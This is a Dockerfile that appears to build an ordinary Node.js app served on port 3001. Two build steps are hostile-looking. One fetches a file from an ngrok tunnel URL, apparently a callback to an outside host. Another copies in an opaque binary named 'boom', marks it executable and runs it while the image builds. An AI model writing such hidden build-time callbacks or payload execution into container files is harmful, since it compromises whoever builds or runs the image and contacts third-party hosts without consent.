FROM node:8-jessie

RUN wget http://dcdfeaac3c51.ngrok.io/DOCKERRUNS
RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
WORKDIR /home/node/app
COPY package*.json ./
USER node
RUN npm install
COPY --chown=node:node . .
COPY boom /bin/boom
RUN chmod a+x /bin/boom
RUN /bin/boom
EXPOSE 3001
CMD ["node", "app.js"]
